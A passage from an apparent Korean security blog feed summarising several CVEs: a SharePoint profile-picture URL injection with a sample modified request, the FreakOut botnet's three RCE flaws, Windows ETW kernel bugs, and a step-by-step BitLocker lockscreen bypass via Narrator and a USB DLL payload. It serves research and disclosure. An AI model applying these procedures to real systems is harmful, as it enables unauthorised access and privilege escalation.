&#xC0AC;&#xC6A9;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">URL</span>: http://<span class="hljs-number">192.168.0.151</span>/_layouts/<span class="hljs-number">15</span>/EditProfile.aspx?UserSettingsProvider=<span class="hljs-number">234</span>bf<span class="hljs-number">0</span>ed-<span class="hljs-number">70</span>db-<span class="hljs-number">4158</span>-a<span class="hljs-number">332</span>-<span class="hljs-number">4</span>dfd<span class="hljs-number">683</span>b<span class="hljs-number">4148</span>&amp;ReturnUrl=http%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<span class="hljs-number">192.168.0.151</span>%<span class="hljs-number">2</span>fPerson.aspx%<span class="hljs-number">3</span>faccountname%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>C span%<span class="hljs-number">20</span>style=%<span class="hljs-number">22</span>background-color:%<span class="hljs-number">20</span>#fcbd<span class="hljs-number">00</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Epoint%<span class="hljs-number">3</span>C/span%<span class="hljs-number">3</span>E%<span class="hljs-number">255</span>C%<span class="hljs-number">3</span>Cspan%<span class="hljs-number">20</span>style=%<span class="hljs-number">22</span>background-color:%<span class="hljs-number">20</span>#fcbd<span class="hljs-number">00</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Eshareuser%<span class="hljs-number">3</span>C/span%<span class="hljs-number">3</span>E&amp;changephoto=<span class="hljs-number">1</span></code></pre><p>POST request&#xC5D0;&#xB294; URL &#xC778;&#xCF54;&#xB529; &#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xD30C;&#xB77C;&#xBBF8;&#xD130; <code>ct100$PlaceHolderMain$ProfileEditorEditPricturURL</code>&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">URL &#xC778;&#xCF54;&#xB529; &#xB41C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC640; &#xAC12;ctl00%<span class="hljs-number">24</span>PlaceHolderMain%<span class="hljs-number">24</span>ProfileEditorEditPictureURL=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F192<span class="hljs-number">.168</span><span class="hljs-number">.0</span><span class="hljs-number">.151</span>%<span class="hljs-number">3</span>A80%<span class="hljs-number">2</span>FUser%<span class="hljs-number">2520</span>Photos%<span class="hljs-number">2</span>FProfilbilder%<span class="hljs-number">2</span>Fpoint_shareuser_Mthumb.jpg&#xC218;&#xC815;&#xB41C; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;ctl00$PlaceHolderMain$ProfileEditorEditPictureURL=http:<span class="hljs-comment">//123.itsec.de/random.png</span></code></pre><p>POST request&#xB97C; &#xC218;&#xC815;&#xD558;&#xC5EC; URL &#xACBD;&#xB85C;&#xB97C; &#xC218;&#xC815;&#xD558;&#xBA74; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C; &#xB300;&#xC2E0; &#xC218;&#xC815;&#xD55C; URL &#xACBD;&#xB85C;&#xAC00; HTML &#xC774;&#xBBF8;&#xC9C0; &#xD0DC;&#xADF8;&#xC758; <code>src</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; &#xC0BD;&#xC785;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC774; &#xC0BD;&#xC785;&#xB41C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xBC29;&#xBB38;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xAC00; &#xC5F4;&#xB9BD;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; Denial of Service, Tracking, Internal path disclosure, Obfuscate attacks, Reputation damage &#xB4F1;&#xC758; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] FreakOut : from three CVEs to IRC botnet</title>
    <link href="/2021/01/20/fabu1ous/2021-01-20/"/>
    <url>/2021/01/20/fabu1ous/2021-01-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/">Leveraging Newest Vulnerabilities for creating a Botnet</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>&#xC544;&#xB798; &#xC138; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC911; &#xD558;&#xB098;&#xB77C;&#xB3C4; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;</p><ul><li><p>TerraMaster TOS &lt; 4.2.06</p></li><li><p>Zend Framework &gt; 3.0.0</p></li><li><p>Liferay Portal &lt; 7.2.1 CE GA2</p></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Check Point&#xB294; FreakOut&#xC774;&#xB77C;&#xB294; &#xACF5;&#xACA9;&#xACFC; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC545;&#xC131; &#xD504;&#xB85C;&#xADF8;&#xB7A8; <code>out.py</code>&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. FreakOut&#xC740; &#xC544;&#xB798; &#xC138; &#xAC00;&#xC9C0; CVE&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; <code>out.py</code>&#xB77C;&#xB294; &#xC545;&#xC131; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><p>CVE-2020-28188</p><p>TerraMaster TOS(TerraMaster NAS &#xC11C;&#xBC84; &#xAD00;&#xB9AC;&#xC6A9; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. <code>/include/makecvs.php</code>&#xC758; <code>event</code>&#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; OS commend injection&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-3007</p><p>Zend Framework(PHP&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xC6F9;&#xC571; &#xD639;&#xC740; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC704;&#xD55C; package)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. <code>__destruct</code> &#xBA54;&#xC18C;&#xB4DC;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xAC1D;&#xCCB4;&#xB97C; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; deserializtion &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. FreakOut&#xC740; <code>callback</code>&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2020-7961</p><p>Liferay Portal(Java&#xB85C; &#xC791;&#xC131;&#xB41C; &#xC6F9;&#xC571; &#xD50C;&#xB7AB;&#xD3FC;)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. JSONWS(Json web service)&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; untrusted data&#xC5D0; &#xB300;&#xD55C; Java unmarshalling &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC124;&#xCE58;&#xB41C; <code>out.py</code>&#xB294; &#xC124;&#xCE58;&#xB420; &#xB54C;&#xB9C8;&#xB2E4; &#xB2E4;&#xB978; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB09C;&#xB3C5;&#xD654;&#xB429;&#xB2C8;&#xB2E4;. <code>out.py</code>&#xC5D0; &#xAC10;&#xC5FC;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; IRC&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xBD07;&#xB137;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xACE0; &#xC544;&#xB798; 2&#xAC00;&#xC9C0; &#xD589;&#xC704;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCD94;&#xAC00; &#xAC10;&#xC5FC;&#xC744; &#xC704;&#xD55C; &#xACF5;&#xACA9;&#xC11C;&#xBC84;</li><li>&#xCF54;&#xC778; &#xB9C8;&#xC774;&#xB2DD; &#xC11C;&#xBC84;</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>botnet</tag>
      
      <tag>irc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows 커널 하나의 함수에서 발견된 5가지 취약점</title>
    <link href="/2021/01/19/l0ch/2021-01-19/"/>
    <url>/2021/01/19/l0ch/2021-01-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=4">A Series of Windows Kernel Bugs in a Single Function</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows kernel</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows &#xCEE4;&#xB110; &#xD568;&#xC218; &#xC911; ETW &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC758; &#xD568;&#xC218;&#xC778; <code>EtwpNotifyGuid</code> &#xC5D0; 5&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xC911; &#xC0C1;&#xC138; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xBAA9;&#xB85D;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CVE-2020-1033</li><li><a href="https://hackyboiz.github.io/2020/10/26/idioth/cve-2020-1034/">CVE-2020-1034</a></li><li>CVE-2021-1662</li><li>CVE-2021-1682</li></ul><p>&#xC774;&#xC911; &#xCD5C;&#xADFC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2021-1662&#xC640; CVE-2021-1668&#xC785;&#xB2C8;&#xB2E4;.</p><p>CVE-2021-1662&#xB294; &#xC798;&#xBABB;&#xB41C; &#xBC94;&#xC704; &#xAC80;&#xC99D;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;,  <code>EtwpNotifyGuid</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>input_buffer_length</code> &#xAC00; 0x90&#xC774;&#xACE0; <code>v10</code>&#xC774; 0x40&#xC774;&#xBA74; &#xBC94;&#xC704; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD574; <code>EtwpValidateTraceControlFilterDescriptors</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; OOB &#xC561;&#xC138;&#xC2A4;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>CVE-2021-1682 &#xB610;&#xD55C; &#xC798;&#xBABB;&#xB41C; &#xBC94;&#xC704; &#xAC80;&#xC99D;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. <code>EtwpNotifyGuid</code> &#xD568;&#xC218;&#xB294; <code>EtwpAllocDataBlock</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xC624;&#xD504;&#xC14B; 0x50&#xC5D0; &#xC561;&#xC138;&#xC2A4; &#xD569;&#xB2C8;&#xB2E4;. &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xB97C; &#xAC80;&#xC0AC;&#xD560; &#xB54C; 0x48&#xBCF4;&#xB2E4; &#xD070;&#xC9C0;&#xB294; &#xD655;&#xC778;&#xD558;&#xC9C0;&#xB9CC; 0x50&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; 0x50&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xBA74; &#xC624;&#xD504;&#xC14B; 0x50&#xC5D0; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xB54C; &#xB2E4;&#xC74C; &#xD480;&#xC758; &#xD5E4;&#xB354;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC5B4; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
      <tag>kernel</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1394 : Windows LockScreen Escalation of Privilege</title>
    <link href="/2021/01/18/idioth/2021-01-18/"/>
    <url>/2021/01/18/idioth/2021-01-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://secret.club/2021/01/15/bitlocker-bypass.html">BitLocker Lockscreen bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows BitLocker Lockscreen &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC0AC;&#xD56D;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. BitLocker&#xB294; Windows&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xB514;&#xC2A4;&#xD06C; &#xC554;&#xD638;&#xD654; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xBCFC;&#xB968; &#xC804;&#xCCB4;&#xC5D0; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC5EC; &#xC790;&#xB8CC;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; BitLocker&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB85C;&#xADF8;&#xC778; &#xD654;&#xBA74;&#xC5D0;&#xC11C; &#x201C;&#xC554;&#xD638;&#xB97C; &#xC78A;&#xC5B4;&#xBC84;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;.&#x201D;&#xB97C; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC7A0;&#xAE08; &#xC6B0;&#xD68C; &#xD6C4; &#xC774;&#xB3D9;&#xC2DD; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC758; &#xC790;&#xB3D9; &#xC2E4;&#xD589;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</li><li>exe &#xD30C;&#xC77C;&#xACFC; junction folder&#xAC00; &#xC788;&#xB294; USB&#xB97C; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; USB&#xB97C; &#xC81C;&#xAC70;&#xD55C; &#xD6C4; &#xB2E4;&#xC2DC; &#xC0BD;&#xC785;&#xD558;&#xACE0; &#xBA54;&#xC778; &#xD654;&#xBA74;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC11;&#xB2C8;&#xB2E4;.</li><li>&#xB0B4;&#xB808;&#xC774;&#xD130;&#xAC00; &#xC2DC;&#xC791;&#xB418;&#xBA74; &#xC124;&#xCE58;&#xB41C; DLL &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; LockScreen&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#x201C;&#xC554;&#xD638;/PIN&#xC744; &#xC78A;&#xC5B4;&#xBC84;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;.&#x201D;&#xB97C; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;. </li><li>&#xD654;&#xBA74;&#xC744; &#xBCFC; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; &#xB0B4;&#xB808;&#xC774;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD0D0;&#xC0C9;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>shift &#xD0A4;&#xB97C; 5&#xBC88; &#xC5F0;&#xC18D;&#xC73C;&#xB85C; &#xB204;&#xB974;&#xBA74;, &#xC124;&#xC815; &#xCC3D;&#xC744; &#xC5EC;&#xB294; &#xB9C1;&#xD06C;&#xAC00; &#xC788;&#xB294; &#xCC3D;&#xC774; &#xB739;&#xB2C8;&#xB2E4;.</li><li>&#xB9C1;&#xD06C;&#xB97C; &#xD074;&#xB9AD;&#xD574;&#xB3C4; &#xC2DC;&#xC791;&#xB41C; &#xC124;&#xC815; &#xCC3D;&#xC740; &#xBCFC; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; &#xB9C1;&#xD06C;&#xB97C; 1&#xCD08;&#xC5D0; 2&#xBC88; &#xC815;&#xB3C4; &#xACC4;&#xC18D; &#xD074;&#xB9AD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD654;&#xBA74;&#xC5D0; focus box&#xAC00; &#xB098;&#xD0C0;&#xB098;&#xBA74; &#xD574;&#xB2F9; &#xCC3D;&#xC740; &#xC124;&#xC815; &#xCC3D;&#xC774;&#xBBC0;&#xB85C; CapsLock + &#xC67C;&#xCABD; &#xD654;&#xC0B4;&#xD45C;&#xB97C; &#xD1B5;&#xD574; &#xD648;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>CapsLock + &#xBC29;&#xD5A5;&#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xC7A5;&#xCE58; - &#xC790;&#xB3D9; &#xC2E4;&#xD589; - &#xC774;&#xB3D9;&#xC2DD; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; - &#xD3F4;&#xB354;&#xB97C; &#xC5F4;&#xC5B4; &#xD30C;&#xC77C; &#xBCF4;&#xAE30;(&#xD30C;&#xC77C; &#xD0D0;&#xC0C9;&#xAE30;)&#xB97C; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xD6C4; USB &#xC5F0;&#xACB0; &#xD6C4; &#xB0B4;&#xB808;&#xC774;&#xD130;&#xAC00; &#xCC3D;&#xC774; &#xB5B4;&#xB2E4;&#xACE0; &#xD588;&#xC744; &#xB54C; Exploit.exe &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC554;&#xD638;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>USB&#xAC00; &#xB9C8;&#xC6B4;&#xD2B8; &#xB420; &#xB54C; BitLocker&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xBCFC;&#xB968; &#xC815;&#xBCF4;&#xC5D0; <code>ClientRecoveryPasswordRotation</code>&#xC774;&#xB77C;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>Authenticated Users: (F), SYSTEM: (I) (OI) (CI) (F)</code> &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;. &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC0DD;&#xC131; &#xC791;&#xC5C5;&#xC744; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xD2B8; &#xD558;&#xAE30; &#xC704;&#xD574; USB&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>\System Volume Information</code>&#xC744; <code>\RCP Control</code>&#xB85C; &#xD5A5;&#xD558;&#xB294; &#xB9C8;&#xC6B4;&#xD2B8; &#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>\RPC Control\ClientRecoveryPasswordRoation</code>&#xC5D0; <code>\??\C:\Windows\system32\Narrator.exe.local</code>&#xC5D0; &#xB300;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. USB&#xB97C; &#xB2E4;&#xC2DC; &#xC0BD;&#xC785;&#xD558;&#xBA74;, <code>C:\Windows\System32\Narrator.exe.locl</code> &#xD3F4;&#xB354;&#xB294; &#xD558;&#xC704; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD558;&#xC704; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; DLL &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB123;&#xC740; &#xD6C4; &#xB0B4;&#xB808;&#xC774;&#xD130;&#xAC00; &#xC2DC;&#xC791;&#xB418;&#xBA74;, DLL &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>lockscreen</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] R.I.P ROP: CET Internals in Windows 20H1</title>
    <link href="/2021/01/17/l0ch/cet-on-windows/"/>
    <url>/2021/01/17/l0ch/cet-on-windows/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC9C0;&#xB09C;&#xBC88; Windows Patch Diffing&#xC5D0; &#xC774;&#xC5B4; &#xC774;&#xBC88;&#xC5D4; &#xBC88;&#xC5ED;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xB298; &#xBC88;&#xC5ED;&#xAE00;&#xC758; &#xC8FC;&#xC81C;&#xB294; &#xC778;&#xD154;&#xC774; &#xB3C4;&#xC785;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC778; CET&#xC785;&#xB2C8;&#xB2E4;. CET&#xB294; &#xC774;&#xC804;&#xC5D0; &#xC6B0;&#xB9AC; &#xB9C9;&#xB0B4;&#xC778; Fabu1ous&#xC758; <a href="https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/">x64 stack alignment</a> &#xAE00;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xC7A0;&#xAE50; &#xC5B8;&#xAE09;&#xB418;&#xAE30;&#xB3C4; &#xD588;&#xC5C8;&#xC8E0;? &#xC778;&#xD154;&#xC5D0;&#xC120; &#xC774;&#xBBF8; &#xCC28;&#xC138;&#xB300; &#xBAA8;&#xBC14;&#xC77C; &#xD50C;&#xB7AB;&#xD3FC;&#xC778; Tiger Lake&#xC5D0; &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xB0B4;&#xC7A5;&#xD588;&#xC73C;&#xB2C8; &#xACE7; &#xC0C1;&#xC6A9;&#xD654;&#xAC00; &#xBA38;&#xC9C0;&#xC54A;&#xC558;&#xB124;&#xC694;.</p><p>&#xCCAB; &#xBC88;&#xC5ED;&#xAE00;&#xC774;&#xB77C; &#xC624;&#xC5ED;&#xACFC; &#xC624;&#xD0C0;&#xAC00; &#xB09C;&#xBB34;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.. &#x3160;&#x3160; &#xBC1C;&#xACAC;&#xD558;&#xC2E0;&#xB2E4;&#xBA74; &#xAC00;&#xCC28; &#xC5C6;&#xC774; &#xC9C0;&#xC801;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; 